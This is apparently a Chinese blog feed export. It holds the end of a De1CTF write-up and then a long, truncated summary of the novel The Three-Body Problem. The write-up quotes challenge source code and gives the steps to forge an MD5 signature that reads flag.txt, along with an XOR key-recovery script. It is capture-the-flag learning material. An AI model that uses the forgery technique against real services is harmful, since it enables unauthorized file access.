class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>回显flag的地方应该是Exec函数，然后要先过一个判断self.checkSign()</p><p>定位到checkSign函数又是一个判断 if(getSign(self.action, self.param) == self.sign)</p><p>在定位到getSign函数  return hashlib.md5(secert_key + param + action).hexdigest()</p><p>这里会把key，param，action串起来然后md5加密，self.sign是cookie里的，这个可以造，再说，然后是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>要求scan在action里面，这样子他会创建一个文件，在scan一个{$param}文件，定位到scan函数，</p><p>return urllib.urlopen(param).read()[:50]，他会打开一个{$param}文件并且只取前50位，所以就打开flag.txt咯，</p><p>patam=flag.txt，然后他会把flag.txt的内容写进那个result文件。接着如果read在action里面，他就会打开result文件，并把内容赋值给result，然后输出（就是给你看啦）。</p><p>那么目的明确了，往前推就是，action=readscan，然后param=flag.txt，那么为了过检查，sign=MD5(flag.txtreadscan)，怎么获得这个呢，有getsign这个函数。怎么回显sign呢？有geneSign()这个函数，geneSign这个函数里的action赋值为scan了，所以我们只需要让param=flag.txtrread，就可以获得MD5(flag.txtreadscan)了。okay，万事俱备。那怎么执行到Exec()函数呢，在/De1ta里的challenge()函数，param可以get。action和sign都是cookie里的。</p><p>所以总的步骤：</p><ol><li>访问/geneSign?param=flag.txtread                                  得到$sign</li><li>访问/De1ta?param=flag.txt                                                抓包，写入sign=$sign和action=readscan</li></ol><p>get flag。</p><h3 id="XORZ"><a href="#XORZ" class="headerlink" title="XORZ"></a>XORZ</h3><p>加密源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> flag,plain</span><br><span class="line"></span><br><span class="line">key=flag.strip(<span class="string">"de1ctf&#123;"</span>).strip(<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">assert</span>(len(key&lt;<span class="number">38</span>))</span><br><span class="line">salt=<span class="string">"WeAreDe1taTeam"</span></span><br><span class="line">ki=cycle(key)</span><br><span class="line">si=cycle(salt)</span><br><span class="line">cipher = <span class="string">''</span>.join([hex(ord(p) ^ ord(next(ki)) ^ ord(next(si)))[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> p <span class="keyword">in</span> plain])</span><br><span class="line"><span class="keyword">print</span> cipher</span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"><span class="comment"># 49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c</span></span><br></pre></td></tr></table></figure><p>解题思路:</p><p>加密脚本是salt^key^plain=output</p><p>所以逆过来，salt^output=key^plain</p><p>已知len(key)&lt;38，</p><p>所以先爆破长度，</p><p>只要备选的key不是空集即可，</p><p>得到可能的长度只有30</p><p>然后就可以列出key的每一位的可能值</p><p>先随便选一组key异或，然后得到原文是莎翁14行诗</p><p>根据原文调整key即可。</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">ps=<span class="string">'1234567890qwertyuiopasdfghjklxcvbnmQWERTYUIOPSDFGHJKLZXCVBNM\'` ;,.'</span></span><br><span class="line">ks=<span class="string">'1234567890qwertyuiopasdfghjklxcvbnmQWERTYUIOPSDFGHJKLZXCVBNM'</span></span><br><span class="line">res=<span class="string">'1e5d4c055104471c6f234f5501555b5a014e5d001c2a54470555064c443e235b4c0e590356542a130a4242335a47551a590a136f1d5d4d440b0956773613180b5f184015210e4f541c075a47064e5f001e2a4f711844430c473e2413011a100556153d1e4f45061441151901470a196f035b0c4443185b322e130806431d5a072a46385901555c5b550a541c1a2600564d5f054c453e32444c0a434d43182a0b1c540a55415a550a5e1b0f613a5c1f10021e56773a5a0206100852063c4a18581a1d15411d17111b052113460850104c472239564c0755015a13271e0a55553b5a47551a54010e2a06130b5506005a393013180c100f52072a4a1b5e1b165d50064e411d0521111f235f114c47362447094f10035c066f19025402191915110b4206182a544702100109133e394505175509671b6f0b01484e06505b061b50034a2911521e44431b5a233f13180b5508131523050154403740415503484f0c2602564d470a18407b775d031110004a54290319544e06505b060b424f092e1a770443101952333213030d554d551b2006064206555d50141c454f0c3d1b5e4d43061e453e39544c17580856581802001102105443101d111a043c03521455074c473f3213000a5b085d113c194f5e08555415180f5f433e270d131d420c1957773f560d11440d40543c060e470b55545b114e470e193c155f4d47110947343f13180c100f565a000403484e184c15050250081f2a54470545104c5536251325435302461a3b4a02484e12545c1b4265070b3b5440055543185b36231301025b084054220f4f42071b1554020f430b196f19564d4002055d79'</span><span class="comment">#res=salt^output</span></span><br><span class="line">trlen= int(len(res)/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">list1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(res),<span class="number">2</span>):</span><br><span class="line">    list1.append(res[i:i+<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">list2=[]                 <span class="comment">#列出key全集</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,trlen):</span><br><span class="line"></span><br><span class="line">    list3=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ks:</span><br><span class="line">        <span class="keyword">if</span> (chr(ord(i)^int(list1[j],<span class="number">16</span>))<span class="keyword">in</span> ps):</span><br><span class="line">            list3.append(i)</span><br><span class="line">    list2.append(list3)             </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">                                      </span><br><span class="line"></span><br><span class="line">                     </span><br><span class="line"><span class="keyword">for</span> length <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">38</span>):          <span class="comment">#根据key[0]不为空集来爆length</span></span><br><span class="line">    x=set(list2[<span class="number">0</span>]) </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,trlen,length):</span><br><span class="line">        x &amp;= set(list2[j])</span><br><span class="line">    <span class="keyword">if</span> len(x)!=<span class="number">0</span>:</span><br><span class="line">        print(length)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">y = []</span><br><span class="line"><span class="keyword">for</span> z <span class="keyword">in</span> range(<span class="number">30</span>):          <span class="comment">#爆key候选集</span></span><br><span class="line">    x=set(list2[z]) </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(z,trlen,<span class="number">30</span>):</span><br><span class="line">        x &amp;= set(list2[j])</span><br><span class="line">    <span class="keyword">if</span> len(x)!=<span class="number">0</span>:</span><br><span class="line">        y.append(x)</span><br><span class="line">print(str(y).replace(<span class="string">"&#125;,"</span>,<span class="string">"&#125;,\n"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key=<span class="string">'W3lc0m3tOjo1nu55un1ojOt3m0cl3W'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ki=cycle(key)           <span class="comment">#看结果</span></span><br><span class="line">str1=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> list1:</span><br><span class="line">    str1+=chr(ord(next(ki))^int(each,<span class="number">16</span>))</span><br><span class="line">print(str1)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛小屋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三体</title>
      <link href="/2019/08/02/%E4%B8%89%E4%BD%93/"/>
      <url>/2019/08/02/%E4%B8%89%E4%BD%93/</url>
      
        <content type="html"><![CDATA[<h1 id="三体"><a href="#三体" class="headerlink" title="三体"></a>三体</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="https://i.loli.net/2020/04/30/xBa2G13zq4LgNuR.png" alt="三体"></p><p>这个暑假，读了三体一书。</p><p>&emsp;&emsp;粗浅的用一句话概括三体这套书，三体人想要侵略地球，人类跟他丫死磕。</p><p>&emsp;&emsp;故事情节跌宕起伏，勾人心弦，但三体令人着迷的地方，不单单只是因为他有一个好故事，更吸引人的地方，是他还拥有发人深思的魔力。</p><h3 id="三体-1"><a href="#三体-1" class="headerlink" title="三体"></a>三体</h3><p>&emsp;&emsp;故事是由三体人和人类中两个默默无闻的人引发的。分别是三体人1379号和地球人叶文洁。故事先从三体人的基本情况说起。三体人居中在距离地球4.3光年外，和人类是非常近的邻居。他们居住的星球非常坑，因为引力作用，三体星球会被拉来拉去，这会导致，这颗星球有时候特别冷，有时候特别热。只有在距离刚刚好的时候，三体文明才会蓬勃发展。还有一种极端的情况，这颗星球会被三体的引力撕裂，那么三体文明就彻底结束了。三体人所面临的问题，便是数学上非常经典的三体问题，小说名字也是由此而来。因为三体问题，三体人没有办法对未来进行准确的预测。像咱们人类都习惯了第二天早上太阳会升起来，但三体人可就没那么好命，第二天太阳是否会升起来，哪个三体人都不知道。在这种环境下，三体人还进化出了一种脱水的能力，以便在恶劣的环境中休眠，正所谓生于忧患而死于安乐，三体人疯狂的发展科技，想找到一个靠谱的星球，就像地球那样，可以在那里生活，因此三体人投入了大量的人力物力，天天仔细监听宇宙里的各种信号，不想放过一丝能找到新家园的机会。</p><p>&emsp;&emsp;接下来是叶文洁，就是她把三体人引过来的。叶文洁是一对中国科学家夫妻的女儿，小日子过得很幸福。但她的父亲在文革期间由于不愿意说谎认罪，被四个都是中学生的女红卫兵，用武装皮带当众抽打致死；母亲在文革中也疯了。后来叶文洁加入了建设兵团，她亲眼目睹了这群人的疯狂，山林草原都变成了荒漠。在这个过程中，他认识了一位记者，白沐林，二人成为了知己。后来这位知己想要给中央寄一封信，反映建设兵团不是在建设而是在毁坏环境。叶文洁看了信后大加赞赏，整封信内容丰富，逻辑缜密，令他信服，但这个记者长期干重活，导致手抖的厉害，于是叶文洁就帮知己重新抄了一遍，后来上级追查了下来，认为这是反动的行径。于是乎这位知己便出卖了叶文洁，说自己并不知道信的内容，这一下全部的责任都推给了叶文洁，叶文洁被关进了看守所，在看守所她拒绝签字陷害她的父亲，受到了变本加厉的迫害，这一切的丑恶让她心中的反人类种子长成了参天大树。对人类彻底的绝望了。后来叶文洁父亲的学生杨伟宁得知此事后，通过让她参与红岸基地的红岸计划救出了叶文洁。</p><p>&emsp;&emsp;红岸计划的主要目的是寻找外星人，以求科技飞跃，这个计划需要的人才极其苛刻，不过叶文洁的条件正好符合，但加入的代价是永远留在基地，与世隔绝。绝望的叶文洁还不犹豫地答应了。几年后，叶文洁和这位父亲的学生，自己的恩人，杨伟宁组建了家庭，生了一个女儿，杨冬。</p><p>&emsp;&emsp;工作期间，聪明的叶文洁利用太阳强化天线功率，向太空发出了地球的第一封信，里面包含着地球文明的基本信息。这个信号，可是三体人做梦都在找的，收到叶文洁信号的是那个叫1379号的三体人。三体的文明是高度集权的，处于极端的专制中，对个体的尊重几乎不尊重。有多不尊重呢？不能工作的人，就得死。毕竟在这种星球环境下，集权才能快速发展三体的文明。1379号孤独地生活了大半辈子，1379号所在的监听站，已经有上千年的历史了。这里只有他一个人，他每天都在一个小房子里，作者监听宇宙信号这种无聊底层的工作。在三体世界里，这是一个卑微的职业，处在社会的最底层，没有人注意他，更悲催的是，他一辈子什么也没听到。命运总是不期而遇，1379号收到了叶文洁的信号，他看到信息时非常感动，毕竟他等了一辈子，他通过自译解系统，看懂了叶文洁发来的信息，他发现这个遥远的星球，就是自己梦中的天堂，全三体人心中理想的家园。他不想把这一消息通知上级，他知道这意味着地球会被侵略，而且即便三体人成功占领地球，也和他没关系，并且一旦他完成任务，他将很有可能失去在社会中存在的价值，也就是说1379的成功，不会改变他孤独而卑微的生活，说不定还会更糟。渐渐地他爱上了这颗遥远的美丽星球，于是他给叶文洁回复了这么一段信息，不要回答，不要回答，不要回答。后面还有一段信息，大致内容如下：我是一个和平主义者，我不知道你是谁，在你的信号来源的方向，是有无数颗行星的。我们无法确定你们的位置，但只要你回复，我们一定会找到你们，我们一定会侵略地球。这一条信息，相当于把三体人千年等一回的机会给放弃了。这条信息一发出去，1379马上就给抓住了，由于1379已经很老了，元首给了他自由，想让他活到地球失去一切希望的那一天，让它美美梦破裂，这叫杀人诛心。与此同时，元首下令，处死与此相关的其余六千位三体人。</p><p>&emsp;&emsp;叶文洁收到外星人的回复后，惊讶不已，心跳加速，已经无法冷静思考的她，她认为人类已经没希望了，所以他想通过三体人这个外力，来帮助人类。便回复了：来吧来帮助我们吧，来侵略我们吧，我来帮你们获得地球。不久后，叶文洁的上级发现了哪里不对，知道了他是在和外星人联系。当那位上级去悬崖下面检查仪器的时候，叶文洁为了保证秘密不被泄露，冷静淡定的锯断了绳索，导致领导坠崖身亡，捎带着把自己老公也杀了。后来这个坠崖事件，被当做普通的工作事故处理了，没人对叶文洁起疑心。锯断绳子的那一刻，叶文洁就已经下定决心，从今儿起，老娘就要把革命的事业进行到底。</p><p>&emsp;&emsp;三体人那边，1379刚捣乱就被抓了，但叶文洁回复时却没人知道。她就在这种没人直接干预的情况下，为全人类也做了个要命的决定。叶文洁这条信息，飞了四年到达了三体星球，三体人对这突如其来的幸运，感到无比幸福。毕竟地球离得这么近，于是三体人把所有资源都用在了造飞船上，之后三体人联系上叶文洁，请她做好接应工作，这一部分就是整个故事的开端。</p><p>&emsp;&emsp;1379和叶文洁这两个无名小卒，一个差点让三体人对生存的机会失之交臂，而另一个给全人类带来了几百年的噩梦，在以前信息闭塞的时代，没有权势的无名小卒，是不可能影响整个世界文明的。但如今这俩人聊着天，就把各自星球的文明，翻来覆去改变了两次。这里警示了我们，让外星人知道我们在哪，是一件特别不着调的事。霍金在之前也说了几乎一样的观点，千万别跟外星人瞎联系。</p><p>&emsp;&emsp;文革过去了，叶文洁终于得以平反，走出了深山，并且可以回到母校任教。由于资历深，叶文洁被选中去负责发射基地的选址项目。她在西北地区认识了一个热爱大自然的国外富二代伊文思，伊文思也是后来在地球接应三体人真正负责人。他虽然富甲一方，但他依然改变不了人们对地球环境的破坏，他一样期望着通过外星人的力量来帮助人类，于是伊文思和叶文洁决定携手共创辉煌，两人成为了地球上三体组织的创始人。他们相互表达敬意，伊文思说出了以后，地球三体组织接纳新成员时必说的一句话，我们是同志了。</p><p>&emsp;&emsp;多年过后伊文思在秘密地在一艘巨轮上，创立了第二红岸基地，在巨轮上建立是为了方便移动便于隐藏。根据叶文洁提供的信息，伊文思与三体人建立了通讯，这里的人将叶文洁称之为最高统帅，这个反人类的组织，目的很明确，消灭人类暴政，世界属于三体。</p><p>&emsp;&emsp;三体人派出了一种叫智子的东西，来封锁地球的基础科学。智子是一个超级微型机器人，它非常的小，可以被加速到接近光速，只要四年多的时间，它就可以从三体行星达到地球。三体人对微观世界的研究远超人类，智子的制造原理非常晦涩难懂，三体的科学家先把复合粒子中的质子展开成二维，然后在质子宏达的二维展开面上，搭建集成电路，制造好后，再把它收缩回普通质子的大小，这样，这个微观粒子，就变成了超级智能计算机。由于智子的捣乱，国际知名组织，科学边界里很多杰出的科学家纷纷自杀，可见三体人把人类科学家逼成什么样了。经政府机构邀请，一位五大三粗，一脸横肉不修边幅的史强警察，和一名研究纳米材料的汪淼教授，开始调查此事。自杀名单中，还包括了叶文洁的女儿杨冬，家人发现了她服用了大量安眠药，死在了床上。杨冬的男友丁仪，给汪淼他们看了杨冬的遗书。遗书很简短也没签字，内容如下，物理学从来就没有存在过。将来也不会存在。我知道自己这样做是不负责任的，但别无选择。史强和汪淼这俩人，一开始像磁铁的两个正极一样合不来，但在后来的合作中，两人产生了感情。正在调查的汪淼，眼前突然出现了一组消散不去，正在倒计时的数字，这组幽灵倒计时可把汪淼折腾惨了，当他暂停了工作，去探求真相后倒计时消失了。汪淼通过射电望远镜，发现了宇宙辐射背景下的倒计时，他相信一定有某种神奇的力量，限制着人类科学。这其实也是智子搞的鬼。它不仅能限制人类的微观研究，还能展开成二维，干扰人类的宏观研究。经过深入的调查，汪淼他们发现了一款名叫三体的游戏。这游戏非常真实，其内容都是尽量还原三体人的生活环境，几经波折后，汪淼通关了游戏，收到了参加三体玩家线下聚会的消息。负责人询问各位玩家，是否同意三体人降临地球，汪淼假装同意，打入了敌人内部，进入组织内部的汪淼惊讶发现，这个组织的精神领袖，正式杨冬年迈的母亲叶文洁。不久之后，史强汪淼里应外合把地球叛军这个组织拿下了，叶文洁被活捉，随后大家便知道了第二红岸基地这艘邮轮的存在。面对这帮叛徒，干掉他们是其次的，最重要的是，获得他们与三体人的聊天记录。毕竟从聊天记录里，能掌握大量的地方情报，也能知道对手的要害在哪。</p><p>&emsp;&emsp;人们为了拿到这份聊天记录，费了千辛万苦，首先上船抓是不靠谱的，这帮人都是亡命徒，随时可能跟数据资料同归于尽，也不能对这艘船进行军事打击，万一炸了，那就功亏一篑了。在审问中人们得知了一个千载难逢的好机会，这艘船会在某一天经过巴拿马运河。这个运河最窄的地方就150米，史强想了个法子，在河的两边架起两根高高的杆子，在杆子上拉起了超韧性的纳米级细丝，每隔50cm拉一根，这些看不见的细丝，锋利无比。如果这艘船穿过这个纳米细丝组成的墙，船和人都会像切豆腐一样被切开，船上的任何人都来不及任何应急措施。当然，用来储存各种数据的硬盘，也会被切开，不过会被切的很平整，是可以还原的。这次行动被称为古筝计划。古筝计划非常成功，这艘船像一叠扑克牌一样，刷的一下就分开了，变成了千层糕，船被切成了50厘米的薄片，伊文思也被切成了三段。人们在船的废墟里，找到了想要的资料，一共有28个G，人们仔细研究了这些资料，得到了两个非常重要的情报。</p><p>&emsp;&emsp;一个大的坏消息是，智子除了封锁人类科技发展，它还是个超级监视器，它利用自己的光速移动能力监视所有人，干扰各别科学家的视神经，每一个人类说的每一句话，做的每一件事，三体人都在全程看直播。如此重要的情报，让人类知道任何开会讨论出来的计划，都会被三体人知道。古筝计划的成功，其实是三体人为了借人类的手，消灭这帮地球叛军的计划。因为三体人的思想是透明的，他们通过思维直接交流，不会撒谎，当他们得知人类有撒谎这个技能后，非常的恐惧。人类在得知有智子这个东西后，智子就不能再干扰人类的宏观观测了，因为它一旦在展开成二维，就很可能被人类消灭。之前汪淼和一些科学家眼前的幽灵倒计时，就是指在在人视网膜上搞的把戏。第二个情报是，在地球上三体人怕一个人类，而且只怕这一个人，地球叛军曾经多次想要杀死他，这个人，就是罗辑。</p><p>&emsp;&emsp;这个故事告诉我们，如果发现组织里有叛徒，最关键的不是消灭它，而是获取敌方高价值的信息，如果叛徒这个棋子用的好，你会比敌人更有利。</p><p>&emsp;&emsp;后来人类所发展的所有战略， 都是基于这两个信息：地球上有个叫智子的机器人在捣乱，和三体想杀一个叫罗辑的男人。人们紧急召开了国际会议，讨论如何应对危机，此时三体人通过智子，给每个人眼前显示出了相同的文字，你们是虫子。</p><p>&emsp;&emsp;当全世界的人得知此消息后，便开始陷入了绝望，汪淼在得知整个事情的来龙去脉后，和杨冬的男友丁仪借酒消愁。两位科学家感叹着人类在三体人眼里就是虫子，还是即将灭绝的虫子，他们耍着酒疯大喊道，末日万岁，虫子王万岁，智子万岁。史强看到后为了给他们大气，让他们振作，把俩人带到了一片麦地，他们注视着麦田，蝗虫在这片麦地漫天飞舞，像沙尘暴啃食着庄稼，两人看到这一幕心有所想，人类与蝗虫科技之间的差距，比人类和三体人之间大多了。我们用飞机喷洒各种杀虫剂，培育他们的天敌，无所不用其极地想消灭他们，但他们翱翔于天地之间，没有被灭绝。把人类看成虫子的三体，似乎忘记了一个事实，虫子虽然很弱小，但从来没有被真正消灭过，三人沐浴在这生命的暴雨中，感受着地球生命的尊严。汪淼和丁仪把手中拎这的酒慢慢洒在脚下，他们说，这，是敬虫子的。</p><h3 id="黑暗森林"><a href="#黑暗森林" class="headerlink" title="黑暗森林"></a>黑暗森林</h3><p>&emsp;&emsp;书的开篇借用一只褐蚁，在叶文洁女儿杨冬的墓碑上爬行，引出了一段往事。上本书的主角叶文洁和新主角罗辑，在叶文洁的女儿杨冬墓前见面，新主角罗辑是杨冬的高中同学，很聪明，但胸无大志，以前是搞天文学的，犹豫不好混现在改行教社会学。叶文洁给出了一条建议，让他把这两个专业结合，做出，宇宙社会学。并给出了两条宇宙社会学的公理：第一，生存是文明的第一需要；第二，文明不断增长和扩张，但宇宙的物质总量保持不变。和两个重要概念，猜疑链和技术爆炸。说完这些，叶文洁便匆匆的离开了。离别时自言自语道，我尽了责任。</p><p>&emsp;&emsp;时光荏苒，多年过后，人类已经知道三体在400年后即将降临，世界各国政府进入了备战状态，准备齐心合力保卫家园。由此开始了，危机纪元。世界上正发生着这几件大事，第一件，规划组件太空军。在这支太空军里，有一位主角，章北海，他是军人世家。在外人眼里，他坚信人类必胜，收到组织高度重视。后来太空军选出了一批信仰坚定的军人冬眠，去增援末日之战，其中就包括他。第二件，全球技术公有化，联合国逐渐成为世界政府，国家的边界开始模糊，地球上出现了逃亡主义，他们认为，地球科技已被锁死，走出太阳系，寻找新家园才能延续下去。但毕竟资源有限，大多数人要留在地球上。不久之后，人人平等的口号响彻地球，联合国一致决定，要死一起死，坚决反对逃亡主义。一时间，保卫家园，绝不逃离，成为了世界的主旋路以及政治正确。</p><p>&emsp;&emsp;画面一转，罗辑这位花花公子，和一位女伴刚从宾馆出来，突然一辆疾驰的车向他们撞来，恰好被消防栓绊倒的罗辑，侥幸逃过一劫。但女伴却被当场撞死。罗辑以为这是意外，他不知道这是三体人给地球叛军下达的暗杀命令。不明真相的罗辑被警务人员带进了一个地下十层的小房子里，在这，他与上本书中的史强相识了。随后，罗辑被大批武装部队护送上了飞机，在多架歼击机的护航以及数名保镖的护送下，罗辑安全抵达了联合国会场，这突如其来的大场面，换在谁身上都得蒙圈。大会上联合国秘书长，宣布了面壁者计划。面壁计划是基于这两个主要情报产生的：一、地球在三体人那已经完全透明了，任何交流、会议都变成了现场直播；二、三体人的弱点在于不懂说谎，在他们的世界里没有阴谋、暗算这些词。面壁计划的核心在于，选出四个战略计划的制定者和领导者，他们完全按照自己的思维制定计划，不与外界交流，计划真正的目的和意图都藏于他们的大脑。他们所表现出来的行为应该是欺骗敌人。这四人被称之为，面壁人。面壁人拥有最高权力去调集地球资源，简而言之就是在世界上选出四个有能力的大骗子，去骗三体人。</p><p>&emsp;&emsp;秘书长公布了面壁者名单。第一位面壁者是刚刚卸任的美国国防部部长，泰勒；第二位是委内瑞拉现任总统，雷迪亚兹；第三位是世界知名脑科学家，希恩斯；第四位是，罗辑。罗辑听到自己名字后差点晕过去。各国领导人，和世界知名人物，齐刷刷地盯着他。罗辑被搀扶到了主席台上。大脑一片空白的罗辑在散会后才回过神，他认为这是搞错了，不断地向所有人拒绝自己面壁人的身份。而所有人都以为，他，已经开始演戏了。</p><p>&emsp;&emsp;当他一人冲出大会后，又遭到了暗杀，被狙击手一枪撂倒。好在他一路上都穿着防弹衣，这之后罗辑一直被保护着，慢慢地，罗辑也想通了。既然自己没法辞职，不如利用特权好好享受人。正当其他面壁者殚精竭虑，绞尽脑汁，准备大干一场时，罗辑的要求在联合国眼里非常奇特， 他先要了个依山傍水，被自然拥抱的山庄，去那开始享受社会文雅的贵族生活。随后，他只要说一句，这是面壁者计划的一部分，他所有花花公子的欲望都会被满足。而事实上，那些世界领导人觉得，罗辑干得很好，不仅让人捉摸不透，还比其他三位花钱少。</p><p>&emsp;&emsp;三体人通过智子，从残余的地球叛军中，选中了三个人，去破解面壁人的计划。这三位被称之为，破壁人。罗辑没有破壁人，因为三体人知道，只要罗辑他自己想不明白，他就是自己的破壁人。其他的三位面壁人，有人在研究核弹，有的在研究军队，有的在研究脑科学。而罗辑在干嘛呢？他在泡妞。</p><p>&emsp;&emsp;他把史强找来，让史强去安装自己的描述，找到他梦中的女神，史强很快找到这个人，她的名字叫，庄颜。是中央美院国画系刚毕业的大学生，史强很简单的就把她忽悠来了，她对庄颜说，世界需要你，面壁者需要你。当罗辑看见自己梦中的女神，活生生地站在面前时，整个人都傻了，他对庄颜说，你的工作是，使自己快乐，成为世界上最幸福最快乐的女孩。这是面壁计划的一部分。</p><p>&emsp;&emsp;不久后，罗辑带着庄颜，去了他最想去的卢浮宫。在蒙娜丽莎的微笑面前，两人坠入爱河，这位纯洁的小女生，成为了罗辑的妻子，从此开始了幸福的生活。史强在之前抓捕地球叛军的行动中，收到了辐射影响身患白血病，现代的医疗手段无能为力，在完成罗辑交代的这个任务后，他进入了冬眠。希望未来的医疗水平能救他一命。</p><p>&emsp;&emsp;五年后，第一个被破壁的面壁人是前美国国防部长，泰勒。破壁人以粉丝的身份走入他的家中，揭穿了他的目的。说道，你表面上是想建立一支太空神风敢死队，跟三体人死磕。其实，你的这批部队，会装备一种叫球状闪电的武器，被它打死的人会变成幽灵态，在开展前夕，你会让他们去偷袭地球军队，把自己人打成量子态的幽灵部队，